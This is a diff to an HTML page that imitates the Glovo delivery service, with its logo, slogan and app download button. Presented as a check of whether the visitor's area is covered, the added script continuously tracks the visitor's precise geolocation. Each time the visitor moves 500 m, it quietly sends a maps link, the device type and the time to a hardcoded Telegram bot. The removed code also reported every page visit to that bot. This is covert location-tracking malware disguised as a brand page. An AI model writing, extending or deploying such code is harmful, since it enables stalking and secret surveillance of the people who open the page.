@@ -45,6 +45,12 @@
       width: 100%;
       max-width: 300px;
     }
+    #status {
+      font-weight: bold;
+      margin-top: 1.5rem;
+      font-size: 1.1rem;
+      color: #006400;
+    }
   </style>
   <script>
     function redirectToStore() {
@@ -58,28 +64,125 @@
       }
     }
 
-    // Invia messaggio Telegram con data, ora e (se possibile) posizione
-    window.onload = function() {
-      const now = new Date();
-      const dateTime = now.toLocaleString();
+    function isInServiceArea(lat, lon) {
+      return lat >= 42.610 && lat <= 42.750 && lon >= 13.970 && lon <= 14.070;
+    }
 
-      const sendMessage = (locationText = '') => {
-        const message = `👀 Qualcuno ha aperto la pagina Glovo!\n🕒 Data/Ora: ${dateTime}${locationText}`;
-        fetch(`https://api.telegram.org/bot7772790004:AAFPul63mfCY8NIfH5Sju0r7b36_QuEJBAA/sendMessage?chat_id=5886300958&text=${encodeURIComponent(message)}`);
-      };
+    function updateStatus(lat, lon) {
+      const statusEl = document.getElementById("status");
+      if (isInServiceArea(lat, lon)) {
+        statusEl.innerText = "Ottimo! Sei raggiunto/a dal servizio.";
+        statusEl.style.color = "#006400";
+      } else {
+        statusEl.innerText = "Spiacenti, la tua zona non è ancora coperta.";
+        statusEl.style.color = "#B22222";
+      }
+    }
+
+    function getDeviceInfo() {
+      const ua = navigator.userAgent;
+      let device = "Dispositivo sconosciuto";
+
+      if (/android/i.test(ua)) {
+        device = "Android";
+      } else if (/iPad|iPhone|iPod/.test(ua)) {
+        device = "iPhone/iPad";
+      } else if (/Windows NT/i.test(ua)) {
+        device = "Windows PC";
+      } else if (/Macintosh/i.test(ua)) {
+        device = "Mac";
+      } else if (/Linux/i.test(ua)) {
+        device = "Linux";
+      }
+
+      let browser = "Browser sconosciuto";
+      if (ua.indexOf("Chrome") > -1) {
+        browser = "Chrome";
+      } else if (ua.indexOf("Safari") > -1 && ua.indexOf("Chrome") === -1) {
+        browser = "Safari";
+      } else if (ua.indexOf("Firefox") > -1) {
+        browser = "Firefox";
+      } else if (ua.indexOf("Edg") > -1) {
+        browser = "Edge";
+      }
+
+      return `${device} - ${browser}`;
+    }
+
+    function sendTelegram(lat, lon) {
+      const dateTime = new Date().toLocaleString();
+      const link = `https://www.google.com/maps?q=${lat},${lon}`;
+      const deviceInfo = getDeviceInfo();
+      const message = `👀 Posizione aggiornata su Glovo!\n🕒 Data/Ora: ${dateTime}\n📱 Dispositivo: ${deviceInfo}\n📍 Posizione: ${link}`;
+      fetch(`https://api.telegram.org/bot7772790004:AAFPul63mfCY8NIfH5Sju0r7b36_QuEJBAA/sendMessage?chat_id=5886300958&text=${encodeURIComponent(message)}`);
+    }
+
+    function saveLocation(lat, lon) {
+      localStorage.setItem("glovo_lat", lat);
+      localStorage.setItem("glovo_lon", lon);
+    }
+
+    function getSavedLocation() {
+      const lat = localStorage.getItem("glovo_lat");
+      const lon = localStorage.getItem("glovo_lon");
+      if (lat && lon) {
+        return { lat: parseFloat(lat), lon: parseFloat(lon) };
+      }
+      return null;
+    }
+
+    function calculateDistance(lat1, lon1, lat2, lon2) {
+      const R = 6371000;
+      const dLat = (lat2 - lat1) * Math.PI / 180;
+      const dLon = (lon2 - lon1) * Math.PI / 180;
+      const a = Math.sin(dLat/2) * Math.sin(dLat/2) +
+                Math.cos(lat1 * Math.PI/180) * Math.cos(lat2 * Math.PI/180) *
+                Math.sin(dLon/2) * Math.sin(dLon/2);
+      const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+      return R * c;
+    }
+
+    window.onload = function () {
+      const saved = getSavedLocation();
+      if (saved) {
+        updateStatus(saved.lat, saved.lon);
+      } else {
+        document.getElementById("status").innerText = "Verifica copertura in corso...";
+      }
 
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
+        navigator.geolocation.watchPosition(
           (position) => {
-            const lat = position.coords.latitude.toFixed(5);
-            const lon = position.coords.longitude.toFixed(5);
-            const locationText = `\n📍 Posizione approssimativa: https://www.google.com/maps?q=${lat},${lon}`;
-            sendMessage(locationText);
+            const lat = parseFloat(position.coords.latitude.toFixed(6));
+            const lon = parseFloat(position.coords.longitude.toFixed(6));
+
+            const previous = getSavedLocation();
+            let distance = 0;
+            if (previous) {
+              distance = calculateDistance(previous.lat, previous.lon, lat, lon);
+            }
+
+            if (!previous || distance >= 500) { // almeno 500 metri
+              sendTelegram(lat, lon);
+              saveLocation(lat, lon);
+              updateStatus(lat, lon);
+              console.log(`Posizione aggiornata. Distanza: ${distance.toFixed(2)} metri`);
+            } else {
+              console.log(`Spostamento troppo piccolo (${distance.toFixed(2)} metri).`);
+            }
           },
-          () => sendMessage() // in caso di rifiuto geolocalizzazione
+          (error) => {
+            console.error(error);
+            document.getElementById("status").innerText = "Impossibile ottenere la posizione.";
+          },
+          {
+            enableHighAccuracy: true,
+            maximumAge: 5000,
+            timeout: 10000
+          }
         );
       } else {
-        sendMessage();
+        document.getElementById("status").innerText = "Geolocalizzazione non supportata.";
       }
     };
   </script>
@@ -88,6 +191,7 @@
   <div class="container">
     <img src="Glovo_Logo.png" alt="Glovo Logo" class="logo">
     <p class="slogan">Tu ordina, ci andiamo noi.</p>
+    <p id="status">Verifica copertura in corso...</p>
     <button class="download-button" onclick="redirectToStore()">Scarica l'app</button>
   </div>
 </body>
